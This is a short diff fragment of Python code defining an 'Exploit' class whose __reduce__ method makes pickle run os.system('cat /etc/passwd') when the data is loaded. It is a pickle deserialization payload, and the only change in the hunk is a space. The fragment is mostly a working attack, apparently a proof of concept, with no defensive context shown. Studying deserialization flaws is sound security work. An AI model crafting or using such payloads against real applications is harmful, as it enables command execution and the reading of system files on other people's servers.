@@ -4,7 +4,7 @@ import pickle
 class Exploit(object):
     def __reduce__(self):
         import os
-        return os.system, ("cat /etc/passwd",)
+        return os.system, ("cat /etc/passwd", )
 
 
 def create_payload():
